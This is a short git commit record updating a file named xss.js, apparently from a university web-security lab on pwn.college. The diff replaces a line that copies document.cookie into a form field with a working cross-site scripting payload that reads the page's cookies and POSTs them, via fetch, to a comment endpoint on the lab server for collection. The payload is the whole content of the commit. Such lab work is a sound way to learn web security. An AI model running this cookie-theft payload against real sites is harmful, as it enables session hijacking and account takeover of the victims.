4a53e31799e31d5e69b2ffe62d23f831d5419f66
Pola Mikhail <pola.alper@gmail.com>
2021-02-24 23:25:37 +0000

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-document.forms[0]['comment'].value = document.cookie;
+let formData = new FormData(); let cookie = document.cookie; formData.append('comment', cookie); let response = await fetch('http://cse545-web.pwn.college/~level07/cgi-bin/comment.py', { method: 'POST', body: formData, headers: {cookie: cookie}});
